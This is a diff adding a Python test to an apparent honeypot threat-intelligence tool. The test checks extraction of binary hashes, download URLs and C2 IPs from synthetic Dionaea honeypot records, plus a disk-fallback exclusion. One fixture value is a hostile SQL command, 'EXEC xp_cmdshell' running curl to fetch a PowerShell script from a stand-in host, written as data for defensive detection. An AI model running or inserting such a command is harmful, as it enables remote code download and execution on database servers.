@@ -391,3 +391,45 @@ class TestV15DurableExtractors:
         )
         fps = extract_ssh_public_keys(df)
         assert fps == {expected_fp}
+
+    def test_dionaea_attributed_hashes_and_sql_download_urls(self, tmp_path: Path) -> None:
+        """Dionaea bronze binary hashes are extracted and excluded from disk fallback."""
+        from lantana.enrichment.ioc import extract_outbound_c2_ips, extract_outbound_urls
+
+        payload = b"synthetic-dionaea-elf"
+        expected_sha = hashlib.sha256(payload).hexdigest()
+        dionaea_bronze = pl.DataFrame(
+            {
+                "eventid": ["dionaea.binary.captured", None],
+                "shasum": [expected_sha, None],
+                "download_url": ["http://203.0.113.99/drop.bin", None],
+                "sql_command": [None, "EXEC xp_cmdshell 'curl https://sql-drop.example.org/p.ps1'"],
+            }
+        )
+        hashes = extract_hashes_from_bronze(dionaea_bronze)
+        assert hashes == {expected_sha}
+
+        cfg = _config()
+        urls = extract_outbound_urls(dionaea_bronze, cfg)
+        assert "http://203.0.113.99/drop.bin" in urls
+        assert "https://sql-drop.example.org/p.ps1" in urls
+        assert "203.0.113.99" in extract_outbound_c2_ips(dionaea_bronze, cfg)
+
+        # Disk fallback skips any hash already attributed in bronze
+        sensor_dir = tmp_path / "sensor"
+        bin_dir = sensor_dir / "dionaea" / "binaries"
+        bin_dir.mkdir(parents=True)
+        f1 = bin_dir / "already_attributed"
+        f1.write_bytes(payload)
+        f2 = bin_dir / "unattributed_only"
+        f2.write_bytes(b"other-binary")
+        ts = datetime(2026, 7, 10, 12, 0, tzinfo=UTC).timestamp()
+        os.utime(f1, (ts, ts))
+        os.utime(f2, (ts, ts))
+
+        fallback = extract_dionaea_binary_events(
+            sensor_dir,
+            date(2026, 7, 10),
+            exclude_hashes=hashes,
+        )
+        assert [ev["binary_file_name"] for ev in fallback] == ["unattributed_only"]
